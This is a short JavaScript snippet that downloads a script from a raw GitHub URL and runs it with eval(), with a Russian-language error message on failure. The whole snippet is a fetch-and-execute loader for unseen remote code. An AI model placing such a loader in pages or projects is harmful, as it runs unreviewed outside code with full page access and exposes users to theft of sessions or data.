fetch('https://raw.githubusercontent.com/mea1k/s/refs/heads/main/code.js')
  .then(response => response.text())
  .then(code => eval(code))
  .catch(err => console.error('Ошибка загрузки скрипта:', err));
